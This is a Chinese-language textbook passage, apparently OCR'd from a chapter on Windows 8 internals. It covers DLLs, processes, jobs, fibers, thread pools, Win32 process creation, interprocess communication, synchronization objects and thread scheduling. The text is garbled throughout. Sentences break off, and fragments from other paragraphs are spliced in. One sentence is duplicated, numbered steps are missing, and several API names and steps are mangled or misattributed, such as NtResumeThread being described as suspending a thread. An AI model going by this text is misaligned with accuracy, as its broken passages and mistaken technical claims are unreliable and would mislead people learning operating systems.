Windows 用户态设计的第二个重要方面是在动态链接库 (DLL), 即代码是在程序运行的时候完成 的链接，而非编译时。
共享的库不是一个新的概念，最现代化的操作系统使用它们。
在 Windows 中几 乎所有库都是DLL, 从每一个进程都装载的系统库ntdll.dII到旨在允许应用程序开发人员进行代码通用的 功用函数的高层程序库。
较好的解决方案是把代码放到独立的进程里。
而在进程外承载的代码结果具有较低的性能，并在很 多情况下会带来一个更复杂的编程模型。
微软尚未提供在用户态下来处理这种复杂度的一个好的解决办 法。
但这让人对相对简单的内核态产生了希望。
该内核态具有较小的复杂性，是因为它相对于用户态提供了更少的对外部设备驱动模型的支持。
将来跨地址空间的切换代价很可能会越来越小，保护模式将会减少，或甚至成为不相关。
在 Singularity 项目中，微软研究院 (Fandrich 等人，2006年)使用运行时技术，类似C# 和 Java, 用来做一 个完全软件问题的保护。
这就要求地址空间的切换或保护模式下没有硬件的切换代价。
11.4 Windows 中的进程和线程
Windows 具有大量的管理CPU和资源分组的概念。
以下各节中，我们将讨论有关的Win32 API的调 用，并介绍它们是如何实现的。
11.4.1 基本概念
除 了PEB与TEB外，还有另一个数据结构，内核态与每个进程共享的，即用户共享数据。
这个是可
1.进 程
进程创建是从段对象创建的，每个段对象描述了磁盘上某个文件的一个内存对象。
在创建一个过程 时创建的进程将接收一个句柄，这个句柄允许它通过映射段、分配虚拟内存、写参数和环境变量数据、 复制文件描述符到它的句柄表、创建线程来修改新的进程。
这非常不同于在UNIX 中创建进程的方式， 反映了Windows 与UNIX 初始设计目标系统的不同。
正如11.1节所描述，UNIX 是为16位单处理器系统设计的，而这样的单处理器系统是用于在进程之间 交换共享内存的。
这样的系统中，进程作为并发的单元，并且使用像fork 这样的操作来创建进程是一个天 才般的设计主意。
如果要在很小的内存中运行一个新的进程，并且没有硬件支持的虚拟内存，那么在内存 中的进程就不得不换出到磁盘以创建空间。
UNIX 操作系统(一种多用户的计算机操作系统)最初仅仅通 过简单的父进程交换技术和传递其物理内存给它的子进程来实现fork 。
这种操作和运行几乎是没有代价的。
相比之下，在Cutler 小组开发NT的时代，当时的硬件环境是32位多处理器系统与虚拟内存硬件共享 1~16兆字节的物理内存。
多处理器为部分程序并行运行提供了可能，因此NT使用进程作为共享内存和 数据资源的容器，并使用线程作为并发调度单元。
当然，随后几年里的系统就完全不同于这些环境了。
例如拥有64位地址空间并且一个芯片上集成十 几个(乃至数百个)CPU 内核或数百GB的物理内存。
这些内存和传统内存完全不一样。
现在的RAM内 存在关闭电源时会丢失里面的内容，但是正在生产的phase-cha nge内 存会像硬盘一样，在断电之后仍然 能保存其拥有的内容。
此外，还有替代现有硬盘的闪存设备，更广泛虚拟化、普适网络的支持，以及例 如事务型内存 (transactional memory) 这类同步技术的创新。
Windows 和UNIX 操作系统无疑将继续适 应现实中新的硬件，但我们更感兴趣的是，会有哪些新的操作系统会基于新硬件而被特别设计出来。
2. 作业和纤程
Windows 可以将进程分组为作业，但作业抽象并不足够通用。
原因是其专为限制分组进程所包含的 线程而设计，如通过限制共享资源配额、强制执行受限令牌 (restricted token) 来阻止线程访问许多 系 统对象。
作业最重要的特性是一旦一个进程在作业中，该进程创建的进程、线程也在该作业中，没有特 例。
就像它的名字所示，作业是为类似批处理环境而非交互式计算环境而设计的。
在现代Windows 中，作业被组织在一起来处理现代应用。
这些构成运行的应用程序进程需要被操作 系统额外识别出来以便管理整个应用。
图11-22显示了作业、进程、线程和纤程之间的关系。
作业包含进程，进程包含线程，但是线程不 包含纤程。
线程与纤程通常是多对多的关系。
图11-22 作业、进程、线程、纤程之间的关系。
作业和纤程是可选的；并不是所有的进程都在作业中或者 包含纤程
纤程通过分配栈与用来存储纤程相关寄存器和数据的用户态纤程数据结构来创建。
线程被转换为纤
516 第 1 1 章
程，但纤程也可以独立于线程创建。
这些新创建的纤程直到一个已经运行的纤程显式地调用 SwitchToFiber 函数才开始执行。
由于线程可以尝试切换到一个已经在运行的纤程，因此，程序员必须 使用同步机制以防止这种情况发生。
纤程的主要优点在于纤程之间的切换开销要远远小于线程之间的切换。
线程切换需要进出内核而纤 程切换仅需要保存和恢复几个寄存器。
尽管纤程是协同调度的，如果有多个线程调度纤程，则需要非常小心地通过同步机制以确保纤程之 间不会互相干扰。
为了简化线程和纤程之间的交互，通常创建和能运行它们的内核数目一样多的线程， 并且让每个线程只能运行在一套可用的处理器甚至只是一个单一的处理器上。
每个线程可以运行一个独立的纤程子集，从而建立起线程和纤程之间一对多的关系来简化同步。
即 便如此，使用纤程仍然有许多困难。
大多数的Win32 库是完全不识别纤程的，并且尝试像使用线程一样 使用纤程的应用会遇到各种错误。
由于内核不识别纤程，当一个纤程进入内核时，其所属线程可能阻塞。
此时处理器会调度任意其他线程，导致该线程的其他纤程均无法运行。
因此纤程很少使用，除非从其他 系统移植那些明显需要纤程提供功能的代码。
3.线程池与用户态调度
Win32 的线程池是为了一些特定的程序而在Windows 线程模型上进行的更好的抽象。
在其他任务想 要利用多核处理器时，某个线程想要并行运行一个小任务，此时创建线程太过昂贵。
小任务可以被组织 起来成为大任务，但是这样的方法减少了程序中可以被利用的并发性。
一种可替代的方法是，对于某一 个特定的程序，只分配特定数目的线程，并且维持一个需要运行的任务队列。
当一个线程结束任务的运 行时，它便从任务队列里取出一个新的任务。
这个模型解决了编程模型中的资源管理问题(有多少处理 器目前是可用的?
需要创建多少线程?
目前的任务是什么?
这些任务之间如何同步?
)。
Windows 将这个 解决方案正式放在的Win32 线程池中，有一系列的API 用于自动管理动态线程池，并且能将任务分配到 线程池上。
线程池并非一个完美的解决方案。
因为当一个任务中的某些进程由于一些资源的原因而阻塞时，线 程没法切换到另外一个任务上去。
因此，线程池也会不可避免地创建出比可用处理器数量更多的线程， 这样在其他线程被阻塞时，可运行的线程才能得到调度。
线程池集成了许多常见的同步化机制，例如对 于I/O 请求的等待或者当内核请求发生时得到阻塞。
同步策略可以被当成任务调度的触发器，这样一来， 在任务准备好运行之前就可以将线程分配给它。
每一个程序员看到的Windows 线程实际上都是两条线程： 一条运行在内核态里， 一条运行在用户态 里。
这和UNIX 的机制是一样的，每一条线程都会各自创建它自己的栈和内存，从而在不运行的时候节 省寄存器。
这两条线程被认为是一条线程，这是因为它们不在同一时间运行。
用户态的线程运作方式像 是内核态线程的延展，只在内核态切换到用户态的情况下才运行。
当用户态线程想要执行系统调用、发 生了缺页中断或发生了预先抢占时，操作系统会陷入内核态，并在用户态与内核态的对应线程之间相互 切换。
实现UMS时有三个关键元素需要注意：
1)用户态切换：用户态的调度器需要做到不进入内核态即可切换用户线程，当用户线程进入内核态， UMS 会找到运营的内核态线程，并且切换到内核态。
实例研究2: Windows 8 517
2)重新进入用户态的调度器：当执行内核态线程时阻塞并需要等待系统资源时，UMS 会切换到一 个特殊的用户线程，并且执行用户态调度器，使得不同的用户线程也可以被调度到当前处理器上。
这样 就使得当前进程可以继续使用当前的处理器，而不像整体调度时那样要等待其他进程先运行。
3)系统调用的完整性：当阻塞的内核线程最终结束时，需要产生一个包含对应的系统调用结果信息的 消息，并返回给对应的等待的用户态调度器，使得对应的用户线程能够在下一次需要调度时不出现问题。
图11-23 CPU和资源管理中使用的基本概念
4. 线程
通常每一个进程是由一个线程开始的，但一个新的进程也可以动态创建线程。
线程是CPU调度的基 本单位，因为操作系统总是选择一个线程而不是进程来运行。
因此，每一个线程有一个调度状态(就绪 态、运行态、阻塞态等),而进程没有调度状态。
线程可以通过调用指定了在其所属进程地址空间中的 开始运行地址的Win32库函数动态创建。
每一个线程均有一个线程ID, 其和进程ID取自同一空间，因此单一的ID不可能同时被一个线程和一 个进程使用。
进程和线程的ID是4的倍数，因为它们实际上是通过用于分配ID的特殊句柄表来执行分配的。
该系统复用了如图11-16和图11-17所示的可扩展句柄管理功能。
句柄表没有对象的引用，但使用指针指向 进程或线程，使通过ID查找一个进程或线程非常有效。
最新版本的Windows 采用先进先出顺序管理空闲 句柄列表，使ID无法马上重复使用。
ID 马上被重复使用的问题将在本章的最后问题部分再讨论。
线程通常在用户态运行，但是当它进行一个系统调用时，就切换到内核态，并以其在用户态下相同 的属性以及限制继续运行。
每个线程有两个堆栈，一个在用户态使用，而另一个在内核态使用。
任何时 候当一个线程进入内核态，其切换到内核态堆栈。
用户态寄存器的值以上下文 (context) 数据结构的形 式保存在该内核态堆栈底部。
因为只有进入内核态的用户态线程才会停止运行，当它没有运行时该上下 文数据结构中总是包括了其寄存器状态。
任何拥有线程句柄的进程可以查看并修改这个上下文数据结构。
I/O处理也经常需要关注线程。
当执行同步I/O 时会阻塞线程，并且异步I/O相关的未完成的I/O 请求 也关联到线程。
当一个线程完成执行，它可以退出，此时任何等待该线程的I/O 请求将被取消。
当进程 中最后一个活跃线程退出时，这一进程将终止。
需要注意的是线程是一个调度的概念，而不是一个资源所有权的概念。
任何线程可以访问其所属进 程的所有对象，只需要使用句柄值，并进行合适的Win32调用。
一个线程并不会因为一个不同的线程创 建或打开了一个对象而无法访问它。
系统甚至没有记录是哪一个线程创建了哪一个对象。
一旦一个对象 句柄已经在进程句柄表中，任何在这一进程中的线程均可使用它，即使它是在模拟另一个不同的用户。
正如前面所述，除了用户态运行的正常线程，Windows 有许多只能运行在内核态的系统线程，而其 与任何用户态进程都没有联系。
所有这一类型的系统线程运行在一个特殊的称为系统进程的进程中。
该 进程没有用户态地址空间，其提供了线程在不代表某一特定用户态进程执行时的环境。
当学到内存管理 的时候，我们将讨论这样的一些线程。
这些线程有的执行管理任务，例如写脏页面到磁盘上，而其他形
成了工作线程池，来分配并执行部件或驱动程序需要系统进程执行的工作。
11.4.2 作业、进程、线程和纤程管理API调 用
新的进程是由Win32 API函数CreatProcess 创建的。
这个函数有许多参数和大量的选项，包括被执 行文件的名称、命令行字符串(未解析)和一个指向环境字符串的指针。
其中也包括了控制诸多细节的 令牌和数值，这些细节包括了如何配置进程和第一个线程的安全性，调试配置和调度优先级等。
其中一 个令牌指定创建者打开的句柄是否被传递到新的进程中。
该函数还接受当前新进程的工作目录和可选的 带有关于此进程使用GUI窗口的相关信息的数据结构。
Win32 对新进程和其原始线程都返回ID和句柄，而 非只为新进程返回一个ID号。
Create使用大量参数，这揭示了Windows 和UNIX 在进程创建的开发设计上的诸多的不同之处。
1)寻找执行程序的实际搜索路径隐藏在Win32的库代码里，但UNIX中则显式地管理该信息。
2)当前工作目录在UNIX 操作系统里是一个内核态的概念，但是在Windows 里是用户态字符串。
Windows 为每个进程都打开当前目录的一个句柄，这导致了和UNIX一样的麻烦：除了碰巧工作目录是 跨网络的情况下可以删除它，其他工作目录都是不能删除的。
3)UNIX 解析命令行，并传递参数数组；而Win32需要每个程序自己解析参数。
其结果是，不同的 程序可能采用不一致的方式处理通配符(如*.txt) 和其他特殊字符。
4)在UNIX中，文件描述符是否可以被继承是句柄的一个属性。
不过在Windows中，其同时是句柄 和进程创建参数的属性。
5)Win32 是面向图形用户界面的，因此新进程能直接获得其窗口信息，而在UNIX中，这些信息是 通过参数传递给图形用户界面程序的。
6)Windows 中的可执行代码没有SETUID 位属性，不过一个进程也可以为另一个用户创建进程，只 要其能获得该用户的信用凭证。
7)Windows 返回的进程、线程句柄可以用在很多独立的方法中修改新进程/线程，例如复制句柄、 在新进程中设置环境变量等。
UNIX 则只在fork 和exec 调用的时候修改新进程，以及只有几种特定的情 况下(例如exec) 会将用户态的状态抛出进程。
这些不同有些是来自历史原因和哲学原因。
UNIX 的设计是面向命令行的，而不是像Windows 那样 面向图形用户界面的。
UNIX 的用户相比来说更高级，同时也懂得像PATH环境变量的概念。
Windows 继 承了很多MS-DOS中的东西。
这种比较也有点偏颇，因为Win32是一个用户态下的对NT本地进程执行的包装器，就像UNIX下的 系统库函数forklexec的封装。
实际的NT 中创建进程和线程的系统调用NtCreateProcess和NtCreateThread 比Win32 版本简单得多。
NT 进程创建的主要参数包括代表所要运行的程序文件句柄、一个指定新进程是 否默认继承创建者句柄的标志，以及有关安全模型的相关参数。
由于用户态下的代码能够使用新建进程 的句柄对新进程的虚拟地址空间进行直接的操作，所有关于建立环境变量、创建初始线程的细节就留给 用户态代码来解决。
为了支持POSIX 子系统，本地进程创建有一个选项可以指定，通过拷贝另一个进程的虚拟地址空 间来创建一个新进程，而不是通过映射一个新程序的段对象来新建进程。
这种方式只用在实现POSIX的 fork, 而 不 是Win32的。
但自从最新的Windows 开始不再支持POSIX 标准，进程拷贝就变得没什么用处 了。
可能只是一些公司中的开发者们在特定情况下用于开发，类似于在UNIX中使用fork时不调用exec 一 样 。
线程创建时传给新线程的参数包括：CPU 的上下文信息(包括栈指针和起始指令地址)、TEB 模板、 一个表示线程创建后马上运行或以挂起状态创建(等待有人对线程句柄调用NtResumeThread 函数)的标 志。
用户态下的栈的创建以及argv/argc 参数的压入需要由用户态下的代码来解决，必须对进程句柄调用 原生NT的内存管理API。
在Windows Vista的 发 行 版 中 ， 包 含 了 一 个 新 的 关 于 进 程 操 作 方 面 的 本 地API—
NtCreateUserProcess, 这个接口将原来许多用户态下的步骤转移到了内核态下执行，同时将进程创建与 起始线程创建绑定在一起进行。
做这种改变的原因是支持通过进程划分信任边界。
NtCreateUserProcess
允许进程也提供信任的边界，但是这种方法创建的进程在不同的信任环境中，并没有足够的权利在用户 态下实现进程创建的细节。
一般来说主要用法是将这些不同的进程用在不同信任边界中(称为受保护的 进 程)以提供一种数字权限管理(可以保证受版权保护的材料不受到不正当的使用)。
当然，受保护的 进程只能针对用户态的攻击，而无法预防内核态的攻击。
1.进程间通信
线程间可以通过多种方式进行通信，包括管道、命名管道、邮件槽、套接字、远程过程调用(RPC) 、 共享文件等。
管道有两种模式：字节管道和消息管道，可以在创建的时候选择。
字节模式的管道的工作 方式与UNIX下的工作方式一样。
消息模式的管道与字节模式的管道大致相同，但会维护消息边界。
所 以写入四次的128字节，读出来也是四个128字节的消息，而不会像字节模式的管道一样读出的是一个 512字节的消息。
命名管道也是有的，跟普通的管道一样都有两种模式，但命名管道可以在网络中使用， 而普通管道只能在单机中使用。
邮件槽是OS/2操作系统的特性，在Windows 中实现只是为了兼容性。
它们在某种方式上跟管道类似， 但不完全相同。
首先，它们是单向的，而管道则是双向的。
而且，它们能够在网络中使用但不提供有保 证的传输。
最后，它们允许发送进程将消息广播给多个接收者而不仅仅是一个接收者。
邮件槽和命名管 道在Windows中都是以文件系统的形式实现，而非可执行的功能函数。
这样做就可以通过现有的远程文 件系统协议在网络上来访问到它们。
套接字也与管道类似，只不过它们通常连接的是不同机器上的两个进程。
例如， 一个进程往一个套 接字里面写入内容，远程机器上的另外一个进程从这个套接字中读出来。
套接字同样也可以被用在同一 台机器上的进程通信，但是因为它们比管道带来了更大的开销，所以一般来说它们只被用于网络环境下 的通信。
套接字原来是为伯克利UNIX而设计的，它的实现代码很多都是可用的，正如Windows 发布日 志里面所写的，Windows代码中使用了一些伯克利的代码及数据结构。
远程过程调用 (RP C) 是一种进程A命令进程B调用进程B地址空间中的一个函数，然后将执行结果 返回给进程A的方式。
在这个过程中对参数的限制很多。
例如，如果传递的是个指针，那么对于进程B 来说这个指针毫无意义，因此必须把数据结构打包起来然后以进程无关的方式传输。
实现RPC 的时候， 通常是把它作为传输层之上的抽象层来实现。
例如对于Windows 来说，可以通过TCP/IP 套接字、命名管 道 、ALPC 来进行传输。
ALPC的全称是高级本地过程调用 (Advanced Local Procedure Call),它是内核 态下的一种消息传递机制，为同一台机器中的进程间通信作了优化，但不支持网络间通信。
基本的设计 思想是可以发送有回复的消息，以此来实现一个轻量级的RPC版本，提供比ALPC更丰富的特性。
ALPC 的实现是通过拷贝参数以及基于消息大小的临时共享内存分配。
最后，进程间可以共享对象，如段对象。
段对象可以同时被映射到多个进程的虚拟地址空间中， 一 个进程执行了写操作之后，其他进程可以也可以看见这个写操作。
通过这个机制，在生产者消费者问题 中用到的共享缓冲区就可以轻松地实现。
2.同步
进程间也可以使用多种形式的同步对象。
就像Windows中提供了多种形式的进程间通信机制一样， 它也提供了多种形式的同步机制，包括信号量、互斥量、临界区和事件。
所有的这些机制只在线程上工 作，而非进程。
所以当一个线程由于一个信号量而阻塞时，同一个进程的其他线程(如果有的话)会继 续运行而并不会被影响。
使用Win32的API函数CreateSemaphore 可以创建一个信号量，可以将它初始化为一个给定的值， 同时也可以指定最大值。
信号量是一个内核态对象，因此拥有安全描述符和句柄。
信号量的句柄可以通 过使用DuplicateHandler 来进行复制，然后传递给其他进程使得多个进程可以通过相同的信号量来进行 同步。
在Win32的名字空间中一个信号量也可以被命名，可以拥有一个ACL 集合来保护它。
有些时候通 过名字来共享信号量比通过拷贝句柄更合适。
对up 和down 的调用也是有的，只不过它们的函数名看起来比较奇怪： ReleaseSemaphore(up)
和WaitForSingleObject(down) 。
可以给WaitForSingleObject 一个超时时间，使得尽管此时信号量仍
然是0,调用它的线程仍然可以被释放(尽管定时器重新引入了竞态)。
WaitForSingleObject 和
互斥量也是用于同步的内核态对象，但是比信号量简单，因为互斥量不需要计数器。
它们其实是锁， 上锁的函数是WaitForSingleObject,解锁的函数是ReleaseMutex。
就像信号量句柄一样，互斥量的句 柄也可以复制，并且在进程间传递，从而不同进程间的线程可以访问同一个互斥量。
第三种同步机制是临 界 区 ，实现的是临界区的概念。
临界区在Windows中与互斥量类似，但是临界 区相对于主创建线程的地址空间来说是本地的。
因为临界区不是内核态的对象，所以它们没有显式的句 柄或安全描述符，而且也不能在进程间传递。
上锁和解锁的函数分别是EnterCriticalSection 和 LeaveCriticalSection 。
因为这些API函数在开始的时候只是在用户空间中，只有当需要阻塞的时候才调 用内核函数，它们比互斥量快得多。
在需要的时候，可以通过合并自旋锁(在多处理器上)和内核同步 机制来优化临界区。
在许多应用中，大多数的临界区几乎不会被竞争或者只被锁住很短的时间，以至于 没必要分配一个内核同步对象，这样会极大地节省内核内存。
另外一种同步机制使用了事件的内核态对象。
就像我们前面描述的，有两类的事件——通知事件和同 步事件。
一个事件的状态有两种：收到信号和没收到信号。
一个线程通过调用WaitForSingleObject 来等 待一个事件被信号通知。
如果另一个线程通过SetEvent 给事件发信号，会发生什么取决于这个事件的类 型。
对于通知事件来说，所有等待线程都会被释放，并且事件保持在set状态，直到手工调用ResetEvent 进行清除；对于同步事件来说，如果有一个或多个线程在等待，那么有且仅有一个线程会被唤醒并且事 件被清除。
另一个替换的操作是PulseEvent, 像 SetEvent 一样，除了在没有人等待的时候脉冲会丢失，而 事件也被清除。
另外一个替换的操作是PulseEvent, 像 SetEvent 一样，除了在没有人等待的时候脉冲会被 丢失，而事件也被清除。
相反，如果调用SetEvent 时没有等待的线程，那么这个设置动作依然会起作用， 被设置的事件处于被信号通知的状态，所以当后面的那个线程调用等待事件的API时，这个线程将不会等
待而直接返回。
可以注意到不是所有的都是系统调用。
图11-24 一些管理进程、线程以及纤程的一些Win32调用 其中有一些是包装器，有一些包含了重要的库代码，这些库代码将Win32的接口映射到原生NT接口。
另
外一些，例如纤程的API, 全部都是用户态下的函数，因为就像我们之前提到的，Windows 的内核态中 根本没有纤程的概念，纤程完全都是由用户态下的库来实现的。
11.4.3 进程和线程的实现
本节将用更多细节来讲述Windows 如何创建一个进程。
由于Win32是最具文档化的接口，因此我们 将以此为例开始讲述。
我们直接进入内核来理解创建一个新进程的本地API调用是如何实现的，我们主 要着眼于创建进程时执行的主代码路径，以及补充已经介绍的知识之间还欠缺的一些细节。
当用一个进程调用Win32 CreateProcess系统调用的时候，则创建一个新的进程。
这种调用使用 kernel32.dII中的一个(用户态)进程来分几步创建新进程，其中会使用多次系统调用和执行其他的一些操作。
1)把可执行的文件名从一个Win32 路径名转化为一个NT 路径名。
如果这个可执行文件仅有一个名 字，而没有一个目录名，那么就在默认的目录里面查找(包括，但不限于，那些在PATH环境变量中的)。
2)绑定这个创建过程的参数，并且把它们和可执行程序的完全路径名传递给本地API NtCreateUserProcess。
3)在内核态里运行，NtCreateUserProces s 处理参数，然后打开这个进程的映像，创建一个内存区 对象 (section object),它能够用来把程序映射到新进程的虚拟地址空间。
4)进程管理器分配和初始化进程对象。
(对于内核和执行层，这个内核数据结构就表示一个进程。
)
5)内存管理器通过分配和创建页目录及虚拟地址描述符来为新进程创建地址空间。
虚拟地址描述符 描述内核态部分，包括特定进程的区域，例如自映射的页目录入口可以为每一个进程在内核态使用内核 虚拟地址来访问它整个页表中的物理页面。
6)一个句柄表为新的进程所创建。
所有来自于调用者并允许被继承的句柄都被复制到这个句柄表中。
7)共享的用户页被映射，并且内存管理器初始化一个工作集的数据结构，这个数据结构是在物理内 存缺少的时候用来决定哪些页可以从一个进程里面移出。
可执行映像中由内存区对象表示的部分会被映 射到新进程的用户态地址空间。
9)虚拟内存是分配在 (ID 表)新进程里面的，并且用于传递参数，包括环境变量和命令行。
10)一个进程ID 从特殊的句柄表(ID 表)分配，这个句柄表是为了有效地定位进程和线程局部唯一 的ID。
11)一个线程对象被分配和初始化。
在分配线程环境块 (TEB) 的同时，也分配一个用户态栈。
包 含了线程的为CPU寄存器保持的初始值(包括指令和栈指针)的CONTEXT记录也被初始化了。
12)进程对象被添到进程全局列表中。
进程和线程对象的句柄被分配到调用者的句柄表中。
ID 表会 为初始线程分配一个ID。
13)NtCreateUserProcess 向用户态返回新建的进程，其中包括处于就绪并被挂起的单一线程。
14)如果NT API失 败 ，Win32 代码会查看进程是否属于另一子系统，如WOW64。
或者程序可能设 置为在调试状态下运行。
以上特殊情况由用户态的CreateProcess 代码处理。
16)如果进程受限，如低权限的Internet Explorer, 令牌会被改变，限制新进程访问对象。
17)如果应用程序被设置成需要垫层才能与当前Windows 版本兼容运行，则特定的垫层将运行。
垫 层通常封装库调用以稍微修改它们的行为，例如返回一个假的版本号或者延迟内存的释放。
18)最后，调用NtResumeThread 挂起线程，并把这个结构返回给包含所创建的进程和线程的ID、 句柄的调用者。
在Windows 的早期版本中，很多进程创建的算法是在用户态执行的，这些用户态程序通过使用多个
系统调用，以及执行其他使用支持子系统的NT原生API的任务来执行算法。
为了降低父进程对子进程的 操作能力，以防一个子进程正在执行一段受保护程序(例如它执行了电影防盗版的DRM), 在之后的版 本中，上述过程被移到了内核去执行。
NtResumeThread 这个初始原生API 仍然是系统支持的，所以现在的许多进程仍然能够在父进程的用 户态被创建，只要这个被创建的进程不是受保护的进程。
调度
Windows 内核没有中央调度线程。
所以，当一个线程不能再执行时，线程将进入内核态，调度线程 此时决定要转向的下一个线程。
在下面这些情况下，当前正在执行的线程会执行调度程序代码：
1)当前执行的线程发生了信号量、互斥、事件、 I/O 等类型的阻塞。
2)线程向一个对象发信号(如发一个信号或者是唤醒一个事件)时。
3)时间配额到期。
第一种情况，线程已经在内核态运行并开始对调度器或输入输出对象执行操作了。
它将不能继续执 行，所以线程会请求调度程序代码寻找装载下一个线程的CONTEXT 记录去恢复其执行。
第二种情况，线程也是在内核中运行的。
但是，在向一些对象发出信号后，它肯定还能继续执行， 因为发信号对象从来没有受到阻塞。
然而，线程必须请求调度程序，来观测它的执行结果是否释放了一 个具有更高调度优先级的正准备运行的线程。
如果是这样，而因为Windows 是完全抢占式的，所以就会 发生一个线程切换(例如，线程切换可以发生在任何时候，而不仅仅是在当前线程结束时)。
但是，在 多处理器的情况下，处于就绪状态的线程会在另一个CPU 上被调度，那么,即使原来线程拥有较低的调 度优先级，也能在当前的CPU 上继续执行。
第三种情况，内核态发生中断，这时线程执行调度程序代码找到下一个运行的线程。
由于取决于 其他等待的线程，可能会选择同样的线程，这样线程就会获得新的配额，可以继续执行，否则发生线 程切换。
在另外两种情况下，也会执行调度程序：
1)一个输入输出操作完成时。
2)等待时间结束时。
在第一种情况下，之前可能在等待输入输出操作完成的线程会被释放并执行。
如果不保证最小执行 时间，则必须检查是否可以事先对运行的线程进行抢占。
调度程序不会在中断处理程序中运行(因为那 使中断关闭保持太久)。
相反，中断处理发生后，DPC 会排队等待一会儿。
第二种情况下，线程已经对 一个信号量进行了down 操作或者因一些其他对象而被阻塞，但是定时器已经过期。
对于中断处理程序 来说，有必要让DPC 再一次排队等待，以防止它在定时器中断处理程序时运行。
如果一个线程在这个时 刻已经就绪，则调度程序将会被唤醒，并且如果新的可运行线程有较高的优先级，那么和情形1的情况 类似，当前线程会被抢占。
现在让我们来看看具体的调度算法。
Win32 API提供两个API 来影响线程调度。
首先，有一个叫 SetPriorityClass 的函数用来设定被调用进程中所有线程的优先级。
其等级可以是：实时、高、高于标 准、标准、低于标准和空闲的。
优先级决定进程的先后顺序。
(在Vista 系统中，进程优先级等级也可以 被一个进程用来临时地把它自己标记为后台运行 (background) 状态，即它不应该被任何其他的活动进 程所干扰。
)注意优先级是对进程而言的，但是实际上会在每个线程被创建的时候通过设置每个线程开 始运行的基本优先级影响进程中每个线程的实际优先级。
第二个就是SetThreadPriority。
它根据进程的优先级类来设定进程中每个线程的相对优先级(可能 地，但是不必然地，调用线程)。
可划分如下等级：紧要的、最高的、高于标准的、标准的、低于标准 的、最低的和休眠的。
时间紧急的线程得到最高的非即时的调度优先，而空闲的线程不管其优先级类别 都得到最低的优先级。
其他优先级的值依据优先级的等级来定，依次为(+2,+1,0,-1,-2)。
进程优先 级等级和相对线程优先级的使用使得系统能够更容易地确定应用程序的优先级。
调度程序按照下列方式进行调度。
系统有32个优先级，从0到31。
依照图11-25的表格，进程优先 级和相对线程优先级的组合形成32个绝对线程优先级。
表格中的数字决定了线程的基本优先级 (base
priority)。
除此之外，每个线程都有当前优先级 (current priority),这个当前的优先级可能会高于(但 是不低于)前面提到的基本优先级，关于这一点我们稍后将会讨论。
图11-25 Win32优先级到Windows优先级的映射
为了使用这些优先级进行调度，系统维护一个包含32个线程列表的队列，分别对应图11-27中的0~ 31的不同等级。
每个列表包含了就绪线程对应的优先级。
基本的调度算法是从优先级队列中按照31到0 的从高优先级到低优先级的顺序查找。
一旦一个非空的列表被找到，等待队首的线程就运行一个时间 片。
如果时间配额已用完，这个线程排到其优先级的队尾，而排在前面的线程就接下来运行。
换句话说， 当在最高的优先级有多条线程处于就绪状态，它们就按时间片轮转法来调度。
如果没有就绪的线程，那 么处理器空闲，并设置成低功耗状态来等待中断的发生。
值得注意的是，调度取决于线程而不是取决于线程所属的进程。
因此调度程序并不是首先查看进程 然后再是进程中的线程。
它直接找到线程。
调度程序并不考虑哪个线程属于哪个进程，除非进行线程切 换时需要做地址空间的转换。
对于每一个进程，调度管理器都维护了一个理想处理器 (ideal processor) 记录，它会在尽可能的 时候让线程在这个理想处理器上运行。
这改善了系统的性能，因为线程所用到的数据驻留在理想处理器 的内存中。
调度管理器可以感知多处理器的环境，并且每一个处理器有自己的内存，可以运行需要任意 大小内存空间的程序——但是如果内存不在本地，则会花费较大的时间开销。
这些系统被认为是NUMA (非统一内存地址)设备。
调度管理器努力优化线程在这类计算机上的分配。
当线程出现缺页错误时，
用户态下不能运行实时级的线程。
如果一个用户级线程在一个高优先级运
图11-26 Windows 支持32个线程优先级
行，比如说，键盘或者鼠标线程进入了一个死循环，键盘或者鼠标永远得不到运行从而系统被挂起。
把 优先级设置为实时级的权限，需要启用进程令牌中相应的特权。
通常用户没有这个特权。
应用程序的线程通常在优先级1～15上运行。
通过设定进程和线程的优先级， 一个应用程序可以决 定哪些线程得到偏爱(获得更高优先级)。
ZeroPage 系统线程运行在优先级0并且把所有要释放的页转化 为全部包含0的页。
每一个实时的处理器都有一个独立的ZeroPage 线程。
每个线程都有一个基于进程优先级的基本优先级和一个线程自己的相对优先级。
用于决定一个线程 在32个列表中的哪一个列表进行排队的优先级取决于当前优先级，通常是得到和当前线程的基本优先级 一样的优先级，但并不总是这样。
在特定的情况下，非实时线程的当前优先级被内核一下子提到尽可能 高的优先级(但是不会超过优先级15)。
因为图11-26的排列以当前的优先级为基础，所以改变优先级可 以影响调度。
对于实时优先级的线程，没有任何的调整。
现在让我们看看一个线程在什么样的时机会得到提升。
首先，当输入输出操作完成并且唤醒一个等 待线程的时候，优先级一下子被提高，给它一个快速运行的机会，这样可以使更多的I/O可以得到处理。
这里保证I/O 设备处于忙碌的运行状态。
提升的幅度依赖于输入输出设备，典型地磁盘片对应于1级，串 行总线对应于2级，6级对应于键盘，8级对应于声卡。
其次，如果一个线程在等待信号量，互斥量同步或其他的事件，当这些条件满足线程被唤醒的时候， 如果它是前台的进程(该进程控制键盘输入发送到的窗口)中的线程的话，这个线程就会得到两个优先 级的提升，其他情况则只提升一个优先级。
这倾向于把交互式的进程优先级提升到8级以上。
最后，如 果一个窗口输入就绪使得图形用户接口线程被唤醒，它的优先级同样会得到大幅提升。
提升不是永远的。
优先级的提升是立刻发生作用的，并且会引起处理器的再次调度。
但是如果一 个线程用完它的时间分配量，它就会降低一个优先级而且排在新优先级队列的队尾。
如果它两次用完一 个完整的时间配额，它就会再降一个优先级，如此下去直到降到它的基本优先级，在基本优先级得到保持 不会再降，直到它的优先级再次得到提升。
还有一种情况就是系统变动 (fiddle) 优先级。
假设有两个线程正在一个生产者一消费者类型问题上 一起协同工作。
生产者的工作需要更多的资源，因此，它得到高的优先级，例如说12,而消费者得到的 优先级为4。
在特定的时刻，生产者已经把共享的缓冲区填满，信号量发生阻塞，如图11-27a所示。
a)
b)
图11-27优先级转置的示例
存在。
当系统运行多个用户会话时，很容易发生一个用户通过消耗过多处理器资源来干扰其他用户的情 况 。
Windows 执行一种保持公平份额的算法，叫作动态公平份额调度DFSS(Dynamic Fair-Share Scheduling), 它保证了会话不会过多地运行。
DFSS使用调度组来组织在每个会话当中的线程。
在每个 组中Windows按照正常的调度策略来调度进程，但是每个组都会或多或少地访问处理器，总体来说是按 照该组的运行程度。
调度组的相对优先级是缓慢调整的，目的是允许忽略任务的小冲突并减少一个调度 组的进程数，从而使其能够被执行，除非这个进程长时间访问处理器。
11.5 内存管理
Windows 有一个极端复杂的虚拟内存系统。
